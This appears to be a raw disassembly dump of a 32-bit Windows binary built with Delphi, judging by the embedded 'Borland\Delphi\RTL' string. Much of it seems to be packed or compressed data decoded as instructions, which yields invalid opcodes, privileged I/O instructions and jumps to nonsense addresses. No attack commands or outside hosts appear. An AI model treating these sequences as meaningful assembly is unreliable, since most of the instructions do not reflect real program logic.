  412bb7:	d2 3a                	sarb   %cl,(%edx)
  412bb9:	03 e9                	add    %ecx,%ebp
  412bbb:	e1 44                	loope  0x412c01
  412bbd:	0e                   	push   %cs
  412bbe:	8b 5d 28             	mov    0x28(%ebp),%ebx
  412bc1:	eb 2e                	jmp    0x412bf1
  412bc3:	55                   	push   %ebp
  412bc4:	21 e9                	and    %ebp,%ecx
  412bc6:	24 07                	and    $0x7,%al
  412bc8:	74 56                	je     0x412c20
  412bca:	d8 af 79 80 23 58    	fsubrs 0x58238079(%edi)
  412bd0:	07                   	pop    %es
  412bd1:	bb 77 74 09 76       	mov    $0x76097477,%ebx
  412bd6:	84 13                	test   %dl,(%ebx)
  412bd8:	b8 04 19 a6 21       	mov    $0x21a61904,%eax
  412bdd:	05 0b 52 b7 73       	add    $0x73b7520b,%eax
  412be2:	53                   	push   %ebx
  412be3:	ad                   	lods   %ds:(%esi),%eax
  412be4:	41                   	inc    %ecx
  412be5:	d6                   	salc
  412be6:	f2 fb                	repnz sti
  412be8:	af                   	scas   %es:(%edi),%eax
  412be9:	21 3f                	and    %edi,(%edi)
  412beb:	13 81 e4 85 25 c6    	adc    -0x39da7a1c(%ecx),%eax
  412bf1:	82 13 00             	adcb   $0x0,(%ebx)
  412bf4:	38 c6                	cmp    %al,%dh
  412bf6:	56                   	push   %esi
  412bf7:	37                   	aaa
  412bf8:	05 89 5d c5 36       	add    $0x36c55d89,%eax
  412bfd:	6b 0f d4             	imul   $0xffffffd4,(%edi),%ecx
  412c00:	90                   	nop
  412c01:	1a 99 ba 37 c3 57    	sbb    0x57c337ba(%ecx),%bl
  412c07:	3b 61 6c             	cmp    0x6c(%ecx),%esp
  412c0a:	41                   	inc    %ecx
  412c0b:	bb c1 3d 7d 02       	mov    $0x27d3dc1,%ebx
  412c10:	1b f7                	sbb    %edi,%esi
  412c12:	11 86 de ee 02 19    	adc    %eax,0x1902eede(%esi)
  412c18:	cb                   	lret
  412c19:	91                   	xchg   %eax,%ecx
  412c1a:	24 16                	and    $0x16,%al
  412c1c:	ac                   	lods   %ds:(%esi),%al
  412c1d:	3b d3                	cmp    %ebx,%edx
  412c1f:	2d 40 5e c6 89       	sub    $0x89c65e40,%eax
  412c24:	7d 92                	jge    0x412bb8
  412c26:	8c 25 97 ed 9b 72    	mov    %fs,0x729bed97
  412c2c:	37                   	aaa
  412c2d:	3f                   	aas
  412c2e:	0a ff                	or     %bh,%bh
  412c30:	15 18 f0 09 09       	adc    $0x909f018,%eax
  412c35:	01 c3                	add    %eax,%ebx
  412c37:	23 67 ed             	and    -0x13(%edi),%esp
  412c3a:	08 83 16 14 db 17    	or     %al,0x17db1416(%ebx)
  412c40:	1c 75                	sbb    $0x75,%al
  412c42:	f0 12 83 34 02 8b d5 	lock adc -0x2a74fdcc(%ebx),%al
  412c49:	c9                   	leave
  412c4a:	74 32                	je     0x412c7e
  412c4c:	b6 6b                	mov    $0x6b,%dh
  412c4e:	b6 37                	mov    $0x37,%dh
  412c50:	7b 18                	jnp    0x412c6a
  412c52:	50                   	push   %eax
  412c53:	89 c8                	mov    %ecx,%eax
  412c55:	20 20                	and    %ah,(%eax)
  412c57:	59                   	pop    %ecx
  412c58:	39 19                	cmp    %ebx,(%ecx)
  412c5a:	89 23                	mov    %esp,(%ebx)
  412c5c:	b0 c1                	mov    $0xc1,%al
  412c5e:	5e                   	pop    %esi
  412c5f:	4b                   	dec    %ebx
  412c60:	7f 18                	jg     0x412c7a
  412c62:	39 eb                	cmp    %ebp,%ebx
  412c64:	51                   	push   %ecx
  412c65:	e6 9b                	out    %al,$0x9b
  412c67:	2d dd 31 10 d0       	sub    $0xd01031dd,%eax
  412c6c:	6a 31                	push   $0x31
  412c6e:	e7 77                	out    %eax,$0x77
  412c70:	ee                   	out    %al,(%dx)
  412c71:	c6                   	(bad)
  412c72:	17                   	pop    %ss
  412c73:	97                   	xchg   %eax,%edi
  412c74:	e0 ef                	loopne 0x412c65
  412c76:	0d 04 a9 56 03       	or     $0x356a904,%eax
  412c7b:	5a                   	pop    %edx
  412c7c:	ff 51 a0             	call   *-0x60(%ecx)
  412c7f:	bb fd d1 48 8a       	mov    $0x8a48d1fd,%ebx
  412c84:	80 41 26 16          	addb   $0x16,0x26(%ecx)
  412c88:	79 0b                	jns    0x412c95
  412c8a:	b1 4a                	mov    $0x4a,%cl
  412c8c:	9f                   	lahf
  412c8d:	ff                   	(bad)
  412c8e:	ff                   	(bad)
  412c8f:	3f                   	aas
  412c90:	ab                   	stos   %eax,%es:(%edi)
  412c91:	2e 15 23 ec cb cc    	cs adc $0xcccbec23,%eax
  412c97:	c8 c9 d7 cf          	enter  $0xd7c9,$0xcf
  412c9b:	c8 cd ce db          	enter  $0xcecd,$0xdb
  412c9f:	d8 ca                	fmul   %st(2),%st
  412ca1:	d9 da                	(bad)
  412ca3:	dc dd                	(bad)
  412ca5:	de df                	(bad)
  412ca7:	a0 63 37 fd e0       	mov    0xe0fd3763,%al
  412cac:	e1 e3                	loope  0x412c91
  412cae:	00 e4                	add    %ah,%ah
  412cb0:	e5 57                	in     $0x57,%eax
  412cb2:	50                   	push   %eax
  412cb3:	52                   	push   %edx
  412cb4:	51                   	push   %ecx
  412cb5:	2d 83 b8 dd 64       	sub    $0x64ddb883,%eax
  412cba:	b7 f0                	mov    $0xf0,%bh
  412cbc:	35 9e 58 b1 31       	xor    $0x31b1589e,%eax
  412cc1:	c0 63 50 5d          	shlb   $0x5d,0x50(%ebx)
  412cc5:	f1                   	int1
  412cc6:	22 63 4b             	and    0x4b(%ebx),%ah
  412cc9:	8f                   	(bad)
  412cca:	0f 6d                	(bad)
  412ccc:	48                   	dec    %eax
  412ccd:	5b                   	pop    %ebx
  412cce:	6a ac                	push   $0xffffffac
  412cd0:	7c cf                	jl     0x412ca1
  412cd2:	78 1a                	js     0x412cee
  412cd4:	31 66 88             	xor    %esp,-0x78(%esi)
  412cd7:	1c f6                	sbb    $0xf6,%al
  412cd9:	05 37 f6 89 90       	add    $0x9089f637,%eax
  412cde:	05 c8 53 d6 89       	add    $0x89d653c8,%eax
  412ce3:	c6                   	(bad)
  412ce4:	89 d7                	mov    %edx,%edi
  412ce6:	0a e1                	or     %cl,%ah
  412ce8:	ff 0e                	decl   (%esi)
  412cea:	fe                   	(bad)
  412ceb:	39 f7                	cmp    %esi,%edi
  412ced:	77 13                	ja     0x412d02
  412cef:	74 2f                	je     0x412d20
  412cf1:	34 78                	xor    $0x78,%al
  412cf3:	2a f3                	sub    %bl,%dh
  412cf5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  412cf6:	89 c1                	mov    %eax,%ecx
  412cf8:	83 e1 03             	and    $0x3,%ecx
  412cfb:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  412cfd:	3c f6                	cmp    $0xf6,%al
  412cff:	5b                   	pop    %ebx
  412d00:	ea 5b 45 74 0e fc 8d 	ljmp   $0x8dfc,$0xe74455b
  412d07:	8b fc                	mov    %esp,%edi
  412d09:	18 11                	sbb    %dl,(%ecx)
  412d0b:	fd                   	std
  412d0c:	19 18                	sbb    %ebx,(%eax)
  412d0e:	dc 56 0a             	fcoml  0xa(%esi)
  412d11:	d6                   	salc
  412d12:	02 c7                	add    %bh,%al
  412d14:	1f                   	pop    %ds
  412d15:	5d                   	pop    %ebp
  412d16:	7f 6c                	jg     0x412d84
  412d18:	c1 5d 0b 81          	rcrl   $0x81,0xb(%ebp)
  412d1c:	c4 04 91             	les    (%ecx,%edx,4),%eax
  412d1f:	50                   	push   %eax
  412d20:	1d eb 01 43 b0       	sbb    $0xb04301eb,%eax
  412d25:	fd                   	std
  412d26:	7f c3                	jg     0x412ceb
  412d28:	8a 03                	mov    (%ebx),%al
  412d2a:	dc 04 3c             	faddl  (%esp,%edi,1)
  412d2d:	20 76 f5             	and    %dh,-0xb(%esi)
  412d30:	80 3b 22             	cmpb   $0x22,(%ebx)
  412d33:	75 0b                	jne    0x412d40
  412d35:	80 7b 01 05          	cmpb   $0x5,0x1(%ebx)
  412d39:	05 fe db 1d 6f       	add    $0x6f1ddbfe,%eax
  412d3e:	f4                   	hlt
  412d3f:	02 eb                	add    %bl,%ch
  412d41:	e6 6a                	out    %al,$0x6a
  412d43:	25 80 fa 0d 1b       	and    $0x1b0dfa80,%eax
  412d48:	43                   	inc    %ebx
  412d49:	eb 05                	jmp    0x412d50
  412d4b:	88 14 04             	mov    %dl,(%esp,%eax,1)
  412d4e:	40                   	inc    %eax
  412d4f:	85 f6                	test   %esi,%esi
  412d51:	2d dc 2a 13 84       	sub    $0x84132adc,%eax
  412d56:	2c 05                	sub    $0x5,%al
  412d58:	12 f0                	adc    %al,%dh
  412d5a:	2b c0                	sub    %eax,%eax
  412d5c:	4f                   	dec    %edi
  412d5d:	dc da                	(bad)
  412d5f:	b2 08                	mov    $0x8,%dl
  412d61:	17                   	pop    %ss
  412d62:	13 3f                	adc    (%edi),%edi
  412d64:	07                   	pop    %es
  412d65:	3d 18 7c b5 f2       	cmp    $0xf2b57c18,%eax
  412d6a:	a3 a3 cd 6a ce       	mov    %eax,0xce6acda3
  412d6f:	00 24 e0             	add    %ah,(%eax,%eiz,8)
  412d72:	6a 95                	push   $0xffffff95
  412d74:	5b                   	pop    %ebx
  412d75:	b0 e0                	mov    $0xe0,%al
  412d77:	13 13                	adc    (%ebx),%edx
  412d79:	78 f8                	js     0x412d73
  412d7b:	fe                   	(bad)
  412d7c:	9b                   	fwait
  412d7d:	ba ee e2 77 3f       	mov    $0x3f77e2ee,%edx
  412d82:	1e                   	push   %ds
  412d83:	68 05 16 8d 1f       	push   $0x1f8d1605
  412d88:	50                   	push   %eax
  412d89:	6a c7                	push   $0xffffffc7
  412d8b:	ba 52 63 f8 58       	mov    $0x58f86352,%edx
  412d90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  412d91:	3a c6                	cmp    %dh,%al
  412d93:	39 eb                	cmp    %ebp,%ebx
  412d95:	1e                   	push   %ds
  412d96:	da 33                	fidivl (%ebx)
  412d98:	72 7c                	jb     0x412e16
  412d9a:	11 40 66             	adc    %eax,0x66(%eax)
  412d9d:	48                   	dec    %eax
  412d9e:	16                   	push   %ss
  412d9f:	ec                   	in     (%dx),%al
  412da0:	0a 6d ef             	or     -0x11(%ebp),%ch
  412da3:	82 d6 33             	adc    $0x33,%dh
  412da6:	71 87                	jno    0x412d2f
  412da8:	03 4b eb             	add    -0x15(%ebx),%ecx
  412dab:	e9 49 08 87 6f       	jmp    0x6fc835f9
  412db0:	0d c3 3c eb ba       	or     $0xbaeb3cc3,%eax
  412db5:	e8 8d 45 e8 4c       	call   0x4d297347
  412dba:	ff 82 fb ff 00 c0    	incl   -0x3fff0005(%edx)
  412dc0:	0f b7 45 f0          	movzwl -0x10(%ebp),%eax
  412dc4:	6b c0 3c             	imul   $0x3c,%eax,%eax
  412dc7:	66 03 45 f2          	add    -0xe(%ebp),%ax
  412dcb:	06                   	push   %es
  412dcc:	3f                   	aas
  412dcd:	66 8b 55 f4          	mov    -0xc(%ebp),%dx
  412dd1:	01 d0                	add    %edx,%eax
  412dd3:	69 15 b8 74 e5 c0 e8 	imul   $0xf60b03e8,0xc0e574b8,%edx
  412dda:	03 0b f6 
  412ddd:	89 05 97 8c b1 d5    	mov    %eax,0xd5b18c97
  412de3:	36 39 e5             	ss cmp %esp,%ebp
  412de6:	5d                   	pop    %ebp
  412de7:	3b 10                	cmp    (%eax),%edx
  412de9:	18 8a 06 e0 86 b0    	sbb    %cl,-0x4f791ffa(%edx)
  412def:	33 fd                	xor    %ebp,%edi
  412df1:	08 b8 d2 d3 af 3f    	or     %bh,0x3fafd3d2(%eax)
  412df7:	dc be bc 66 c7 88    	fdivrl -0x77389944(%esi)
  412dfd:	cd c1                	int    $0xc1
  412dff:	e0 10                	loopne 0x412e11
  412e01:	66 05 89 d1          	add    $0xd189,%ax
  412e05:	68 09 f3 ab df       	push   $0xdfabf309
  412e0a:	7a b7                	jp     0x412dc3
  412e0c:	cf                   	iret
  412e0d:	89 d1                	mov    %edx,%ecx
  412e0f:	aa                   	stos   %al,%es:(%edi)
  412e10:	5f                   	pop    %edi
  412e11:	3b 69 15             	cmp    0x15(%ecx),%ebp
  412e14:	46                   	inc    %esi
  412e15:	43                   	inc    %ebx
  412e16:	08 08                	or     %cl,(%eax)
  412e18:	42                   	inc    %edx
  412e19:	89 c6                	mov    %eax,%esi
  412e1b:	67 8d 63 0a          	lea    0xa(%bp,%di),%esp
  412e1f:	f7 e2                	mul    %edx
  412e21:	45                   	inc    %ebp
  412e22:	e7 52                	out    %eax,$0x52
  412e24:	83 ec 6c             	sub    $0x6c,%esp
  412e27:	db 0f                	fisttpl (%edi)
  412e29:	fe c2                	inc    %dl
  412e2b:	cf                   	iret
  412e2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  412e2d:	99                   	cltd
  412e2e:	31 d0                	xor    %edx,%eax
  412e30:	29 d0                	sub    %edx,%eax
  412e32:	b9 3e 31 db 89       	mov    $0x89db313e,%ecx
  412e37:	f7 37                	divl   (%edi)
  412e39:	75 61                	jne    0x412e9c
  412e3b:	a9 f1 4e 30 2f       	test   $0x2f304ef1,%eax
  412e40:	1c 43                	sbb    $0x43,%al
  412e42:	46                   	inc    %esi
  412e43:	f1                   	int1
  412e44:	85 f6                	test   %esi,%esi
  412e46:	d5 d6                	aad    $0xd6
  412e48:	ff 02                	incl   (%edx)
  412e4a:	61                   	popa
  412e4b:	c6 04 1c 2d          	movb   $0x2d,(%esp,%ebx,1)
  412e4f:	43                   	inc    %ebx
  412e50:	88 1f                	mov    %bl,(%edi)
  412e52:	47                   	inc    %edi
  412e53:	8b 3c 14             	mov    (%esp,%edx,1),%edi
  412e56:	8d                   	lea    (bad),%edi
  412e57:	fe                   	(bad)
  412e58:	3e b8 bc ff 00 2d    	ds mov $0x2d00ffbc,%eax
  412e5e:	b9 06 29 d9 7e       	mov    $0x7ed92906,%ecx
  412e63:	fd                   	std
  412e64:	b1 ed                	mov    $0xed,%cl
  412e66:	ff f6                	push   %esi
  412e68:	4f                   	dec    %edi
  412e69:	ff b0 20 68 8a 44    	push   0x448a6820(%eax)
  412e6f:	1c ff                	sbb    $0xff,%al
  412e71:	88 07                	mov    %al,(%edi)
  412e73:	47                   	inc    %edi
  412e74:	4b                   	dec    %ebx
  412e75:	75 f6                	jne    0x412e6d
  412e77:	e4 18                	in     $0x18,%al
  412e79:	ef                   	out    %eax,(%dx)
  412e7a:	6d                   	insl   (%dx),%es:(%edi)
  412e7b:	b3 5d                	mov    $0x5d,%bl
  412e7d:	6b 81 4a a3 18 4c 6b 	imul   $0x6b,0x4c18a34a(%ecx),%eax
  412e84:	65 50                	gs push %eax
  412e86:	ff 76 6b             	push   0x6b(%esi)
  412e89:	34 11                	xor    $0x11,%al
  412e8b:	73 54                	jae    0x412ee1
  412e8d:	62 bf cc 00 0c 8a    	bound  %edi,-0x75f3ff34(%edi)
  412e93:	1e                   	push   %ds
  412e94:	46                   	inc    %esi
  412e95:	80 fb 20             	cmp    $0x20,%bl
  412e98:	cf                   	iret
  412e99:	f2 f6 f6             	repnz div %dh
  412e9c:	74 f8                	je     0x412e96
  412e9e:	b5 00                	mov    $0x0,%ch
  412ea0:	06                   	push   %es
  412ea1:	2d 74 69 04 2b       	sub    $0x2b046974,%eax
  412ea6:	74 66                	je     0x412f0e
  412ea8:	24 78                	and    $0x78,%al
  412eaa:	f7 5a cb             	negl   -0x35(%edx)
  412ead:	cb                   	lret
  412eae:	74 61                	je     0x412f11
  412eb0:	58                   	pop    %eax
  412eb1:	74 5c                	je     0x412f0f
  412eb3:	30 0e                	xor    %cl,(%esi)
  412eb5:	27                   	daa
  412eb6:	11 5d 89             	adc    %ebx,-0x77(%ebp)
  412eb9:	85 4f 4f             	test   %ecx,0x4f(%edi)
  412ebc:	4a                   	dec    %edx
  412ebd:	84 5a 20             	test   %bl,0x20(%edx)
  412ec0:	f5                   	cmc
  412ec1:	05 34 fb ff 5b       	add    $0x5bfffb34,%eax
  412ec6:	ab                   	stos   %eax,%es:(%edi)
  412ec7:	80 4f 11 09          	orb    $0x9,0x11(%edi)
  412ecb:	77 2c                	ja     0x412ef9
  412ecd:	39 f8                	cmp    %edi,%eax
  412ecf:	77 28                	ja     0x412ef9
  412ed1:	8d 04 80             	lea    (%eax,%eax,4),%eax
  412ed4:	01 c0                	add    %eax,%eax
  412ed6:	01 d8                	add    %ebx,%eax
  412ed8:	29 fd                	sub    %edi,%ebp
  412eda:	5b                   	pop    %ebx
  412edb:	e9 9b 19 75 e6       	jmp    0xe6b6487b
  412ee0:	fe cd                	dec    %ch
  412ee2:	27                   	daa
  412ee3:	69 7c 12 59 31 f6 89 	imul   $0x3289f631,0x59(%edx,%edx,1),%edi
  412eea:	32 
  412eeb:	e0 ee                	loopne 0x412edb
  412eed:	ff                   	(bad)
  412eee:	ff 89 46 eb 06 f7    	decl   -0x8f914ba(%ecx)
  412ef4:	d8 7e f0             	fdivrs -0x10(%esi)
  412ef7:	78 ee                	js     0x412ee7
  412ef9:	5b                   	pop    %ebx
  412efa:	29 de                	sub    %ebx,%esi
  412efc:	eb ec                	jmp    0x412eea
  412efe:	fe c5                	inc    %ch
  412f00:	27                   	daa
  412f01:	eb bc                	jmp    0x412ebf
  412f03:	bf 6d 6f c7 16       	mov    $0x16c76f6d,%edi
  412f08:	62 0f                	bound  %ecx,(%edi)
  412f0a:	31 74 df 48          	xor    %esi,0x48(%edi,%ebx,8)
  412f0e:	61                   	popa
  412f0f:	72 03                	jb     0x412f14
  412f11:	50                   	push   %eax
  412f12:	20 74 7f d9          	and    %dh,-0x27(%edi,%edi,2)
  412f16:	9e                   	sahf
  412f17:	53                   	push   %ebx
  412f18:	76 0b                	jbe    0x412f25
  412f1a:	07                   	pop    %es
  412f1b:	11 05 77 d0 80 c3    	adc    %eax,0xc380d077
  412f21:	0a 5e c9             	or     -0x37(%esi),%bl
  412f24:	12 fd                	adc    %ch,%bh
  412f26:	87 2d 59 04 5c d5    	xchg   %ebp,0xd55c0459
  412f2c:	eb a9                	jmp    0x412ed7
  412f2e:	c3                   	ret
  412f2f:	ff 25 5c 7b fd 46    	jmp    *0x46fd7b5c
  412f35:	c7 38 33 db 0f       	xbegin 0x101c6272,(bad)
  412f3a:	19 84 04 07 75 1c 6a 	sbb    %eax,0x6a1c7507(%esp,%eax,1)
  412f41:	01 30                	add    %esi,(%eax)
  412f43:	6c                   	insb   (%dx),%es:(%edi)
  412f44:	18 8e 0b 25 00 18    	sbb    %cl,0x1800250b(%esi)
  412f4a:	60                   	pusha
  412f4b:	0d ac 10 1a 7f       	or     $0x7f1a10ac,%eax
  412f50:	e4 67                	in     $0x67,%al
  412f52:	d7                   	xlat   %ds:(%ebx)
  412f53:	02 b3 01 5f ff 63    	add    0x63ff5f01(%ebx),%dh
  412f59:	cb                   	lret
  412f5a:	74 e1                	je     0x412f3d
  412f5c:	f4                   	hlt
  412f5d:	f6 05 00 bf d9 f8 09 	testb  $0x9,0xf8d9bf00
  412f64:	b0 50                	mov    $0x50,%al
  412f66:	b7 76                	mov    $0x76,%bh
  412f68:	fc                   	cld
  412f69:	50                   	push   %eax
  412f6a:	34 42                	xor    $0x42,%al
  412f6c:	68 58 88 68 35       	push   $0x35688858
  412f71:	1a 3e                	sbb    (%esi),%bh
  412f73:	1c 12                	sbb    $0x12,%al
  412f75:	4a                   	dec    %edx
  412f76:	b8 74 4d d0 da       	mov    $0xdad04d74,%eax
  412f7b:	62 79 6e             	bound  %edi,0x6e(%ecx)
  412f7e:	ef                   	out    %eax,(%dx)
  412f7f:	31 2a                	xor    %ebp,(%edx)
  412f81:	30 20                	xor    %ah,(%eax)
  412f83:	6c                   	insb   (%dx),%es:(%edi)
  412f84:	f4                   	hlt
  412f85:	69 96 ed 76 54 2f f4 	imul   $0xf83350f4,0x2f5476ed(%esi),%edx
  412f8c:	50 33 f8 
  412f8f:	00 74 c9 6a          	add    %dh,0x6a(%ecx,%ecx,8)
  412f93:	0f 97 84 4a fa b5 ef 	seta   -0x3e104a06(%edx,%ecx,2)
  412f9a:	c1 
  412f9b:	1a b0 38 15 b0 ab    	sbb    -0x544feac8(%eax),%dh
  412fa1:	ef                   	out    %eax,(%dx)
  412fa2:	66 a1 70 c7 fb df    	mov    0xdffbc770,%ax
  412fa8:	f1                   	int1
  412fa9:	66 25 c0 ff          	and    $0xffc0,%ax
  412fad:	56                   	push   %esi
  412fae:	f8                   	clc
  412faf:	66 83 e2 3f          	and    $0x3f,%dx
  412fb3:	66 0b c2             	or     %dx,%ax
  412fb6:	66 a3 14 5b ff ff    	mov    %ax,0xffff5b14
  412fbc:	7f a9                	jg     0x412f67
  412fbe:	ff 4f 46             	decl   0x46(%edi)
  412fc1:	54                   	push   %esp
  412fc2:	57                   	push   %edi
  412fc3:	41                   	inc    %ecx
  412fc4:	52                   	push   %edx
  412fc5:	45                   	inc    %ebp
  412fc6:	5c                   	pop    %esp
  412fc7:	42                   	inc    %edx
  412fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  412fc9:	72 6c                	jb     0x413037
  412fcb:	61                   	popa
  412fcc:	6e                   	outsb  %ds:(%esi),(%dx)
  412fcd:	64 5c                	fs pop %esp
  412fcf:	44                   	inc    %esp
  412fd0:	65 6c                	gs insb (%dx),%es:(%edi)
  412fd2:	70 68                	jo     0x41303c
  412fd4:	69 fb af ff ff 5c    	imul   $0x5cffffaf,%ebx,%edi
  412fda:	52                   	push   %edx
  412fdb:	54                   	push   %esp
  412fdc:	4c                   	dec    %esp
  412fdd:	00 46 50             	add    %al,0x50(%esi)
  412fe0:	55                   	push   %ebp
  412fe1:	4d                   	dec    %ebp
  412fe2:	61                   	popa
  412fe3:	73 6b                	jae    0x413050
  412fe5:	56                   	push   %esi
  412fe6:	61                   	popa
  412fe7:	6c                   	insb   (%dx),%es:(%edi)
  412fe8:	75 65                	jne    0x41304f
  412fea:	18 db                	sbb    %bl,%bl
  412fec:	e3 9b                	jecxz  0x412f89
  412fee:	d9 2d 39 e9 5f 60    	fldcw  0x605fe939
  412ff4:	d2 df                	rcr    %cl,%bh
  412ff6:	41                   	inc    %ecx
  412ff7:	70 d4                	jo     0x412fcd
  412ff9:	31 c9                	xor    %ecx,%ecx
  412ffb:	8a 0e                	mov    (%esi),%cl
  412ffd:	41                   	inc    %ecx
  412ffe:	d1 f8                	sar    $1,%eax
  413000:	26 da 35 27 8b 40 d1 	fidivl %es:0xd1408b27
  413007:	15 94 89 c2 58       	adc    $0x58c28994,%eax
  41300c:	05 16 8e 6c fb       	add    $0xfb6c8e16,%eax
  413011:	1b 18                	sbb    (%eax),%ebx
  413013:	89 c3                	mov    %eax,%ebx
  413015:	fc                   	cld
  413016:	8b 91 5e ba eb fa    	mov    -0x51445a2(%ecx),%edx
  41301c:	56                   	push   %esi
  41301d:	c0 8b 76 dc c5 07 21 	rorb   $0x21,0x7c5dc76(%ebx)
  413024:	2b 48 89             	sub    -0x77(%eax),%ecx
  413027:	5b                   	pop    %ebx
  413028:	f6 75 e9             	divb   -0x17(%ebp)
  41302b:	96                   	xchg   %eax,%esi
  41302c:	4c                   	dec    %esp
  41302d:	b3 fa                	mov    $0xfa,%bl
  41302f:	2c ac                	sub    $0xac,%al
  413031:	27                   	daa
  413032:	b2 36                	mov    $0x36,%dl
  413034:	c4 bc 7f dd 2f b7 1c 	les    0x1cb72fdd(%edi,%edi,2),%edi
  41303b:	0c 0b                	or     $0xb,%al
  41303d:	0f 08                	invd
  41303f:	64 64 8f 05 77 78 2e 	fs pop %fs:0xdf2e7877
  413046:	df 
  413047:	56                   	push   %esi
  413048:	c1 c3 18             	rol    $0x18,%ebx
  41304b:	6c                   	insb   (%dx),%es:(%edi)
  41304c:	7e 05                	jle    0x413053
  41304e:	5c                   	pop    %esp
  41304f:	af                   	scas   %es:(%edi),%eax
  413050:	fe                   	(bad)
  413051:	52                   	push   %edx
  413052:	11 5f 62             	adc    %ebx,0x62(%edi)
  413055:	08 b2 01 ff 51 fc    	or     %dh,-0x3ae00ff(%edx)
  41305b:	37                   	aaa
  41305c:	2d fd c6 77 64       	sub    $0x6477c6fd,%eax
  413061:	d7                   	xlat   %ds:(%ebx)
  413062:	ab                   	stos   %eax,%es:(%edi)
  413063:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  413066:	60                   	pusha
  413067:	51                   	push   %ecx
  413068:	c1 e9 02             	shr    $0x2,%ecx
  41306b:	49                   	dec    %ecx
  41306c:	01 59 0d             	add    %ebx,0xd(%ecx)
  41306f:	6c                   	insb   (%dx),%es:(%edi)
  413070:	37                   	aaa
  413071:	22 00                	and    (%eax),%al
  413073:	ea 89 e2 15 b8 1b 01 	ljmp   $0x11b,$0xb815e289
  41307a:	bf 81 69 ab 51       	mov    $0x51ab6981,%edi
  41307f:	32 dc                	xor    %ah,%bl
  413081:	9b                   	fwait
  413082:	0c 1b                	or     $0x1b,%al
  413084:	eb ed                	jmp    0x413073
  413086:	39 d4                	cmp    %edx,%esp
  413088:	4b                   	dec    %ebx
  413089:	ed                   	in     (%dx),%eax
  41308a:	d6                   	salc
  41308b:	fa                   	cli
  41308c:	74 1d                	je     0x4130ab
  41308e:	5b                   	pop    %ebx
  41308f:	8b 0b                	mov    (%ebx),%ecx
  413091:	3e 0d 73 10 88 58    	ds or  $0x58881073,%eax
  413097:	8b 8a dd db a5 7b    	mov    0x7ba5dbdd(%edx),%ecx
  41309d:	09 34 38             	or     %esi,(%eax,%edi,1)
  4130a0:	0f 1c 49 75          	nopl   0x75(%ecx)
  4130a4:	1c 75                	sbb    $0x75,%al
  4130a6:	e3 d6                	jecxz  0x41307e
  4130a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4130a9:	d0 c5                	rol    $1,%ch
  4130ab:	1f                   	pop    %ds
  4130ac:	63 10                	arpl   %edx,(%eax)
  4130ae:	3b 39                	cmp    (%ecx),%edi
  4130b0:	d0 99 d8 f1 33 0b    	rcrb   $1,0xb33f1d8(%ecx)
  4130b6:	b4 3b                	mov    $0x3b,%ah
  4130b8:	8c f3                	mov    %?,%ebx
  4130ba:	ab                   	stos   %eax,%es:(%edi)
  4130bb:	57                   	push   %edi
  4130bc:	93                   	xchg   %eax,%ebx
  4130bd:	17                   	pop    %ss
  4130be:	3a d8                	cmp    %al,%bl
  4130c0:	5c                   	pop    %esp
  4130c1:	17                   	pop    %ss
  4130c2:	33 d0                	xor    %eax,%edx
  4130c4:	48                   	dec    %eax
  4130c5:	0d d2 0f 51 17       	or     $0x17510fd2,%eax
  4130ca:	5b                   	pop    %ebx
  4130cb:	e0 5b                	loopne 0x413128
  4130cd:	b5 02                	mov    $0x2,%ch
  4130cf:	66 f2 af             	repnz scas %es:(%edi),%ax
  4130d2:	f0 59                	lock pop %ecx
  4130d4:	63 3e                	arpl   %edi,(%esi)
  4130d6:	a0 75 6b 61 c3       	mov    0xc3616b75,%al
  4130db:	58                   	pop    %eax
  4130dc:	97                   	xchg   %eax,%edi
  4130dd:	29 27                	sub    %esp,(%edi)
  4130df:	5c                   	pop    %esp
  4130e0:	47                   	inc    %edi
  4130e1:	ca 7c e3             	lret   $0xe37c
  4130e4:	8f                   	(bad)
  4130e5:	76 5f                	jbe    0x413146
  4130e7:	7b 2a                	jnp    0x413113
  4130e9:	1b 88 59 c4 02 ff    	sbb    -0xfd3ba7(%eax),%ecx
  4130ef:	e3 59                	jecxz  0x41314a
  4130f1:	b9 25 6a 36 1b       	mov    $0x1b366a25,%ecx
  4130f6:	17                   	pop    %ss
  4130f7:	f8                   	clc
  4130f8:	b8 27 80 07 dd       	mov    $0xdd078027,%eax
  4130fd:	5e                   	pop    %esi
  4130fe:	38 ec                	cmp    %ch,%ah
  413100:	53                   	push   %ebx
  413101:	03 53 a6             	add    -0x5a(%ebx),%edx
  413104:	1a 66 09             	sbb    0x9(%esi),%ah
  413107:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413108:	17                   	pop    %ss
  413109:	66 07                	popw   %es
  41310b:	83 6d 4d c1          	subl   $0xffffffc1,0x4d(%ebp)
  41310f:	c0 9d 50 3a 58 d9 58 	rcrb   $0x58,-0x26a7c5b0(%ebp)
  413116:	a0 7d 7b d9 5b       	mov    0x5bd97b7d,%al
  41311b:	ff e1                	jmp    *%ecx
  41311d:	b6 08                	mov    $0x8,%dh
  41311f:	ff 61 f0             	jmp    *-0x10(%ecx)
  413122:	ff b2 53 01 06 0a    	push   0xa060153(%edx)
  413128:	5c                   	pop    %esp
  413129:	0d 7c 03 1f 7c       	or     $0x7c1f037c,%eax
  41312e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41312f:	de 60 bb             	fisubs -0x45(%eax)
  413132:	3b 10                	cmp    (%eax),%edx
  413134:	64 36 89 44 69 08    	fs mov %eax,%ss:0x8(%ecx,%ebp,2)
  41313a:	c7                   	(bad)
  41313b:	89 d8                	mov    %ebx,%eax
  41313d:	60                   	pusha
  41313e:	63 c7                	arpl   %eax,%edi
  413140:	39 2c 61             	cmp    %ebp,(%ecx,%eiz,2)
  413143:	41                   	inc    %ecx
  413144:	0c 12                	or     $0x12,%al
  413146:	0a a3 5a 61 6b 54    	or     0x546b615a(%ebx),%ah
  41314c:	fb                   	sti
  41314d:	07                   	pop    %es
  41314e:	1d 1c 1a c3 0c       	sbb    $0xcc31a1c,%eax
  413153:	34 2e                	xor    $0x2e,%al
  413155:	42                   	inc    %edx
  413156:	c3                   	ret
  413157:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  413158:	0e                   	push   %cs
  413159:	81 50 35 58 48 04 fd 	adcl   $0xfd044858,0x35(%eax)
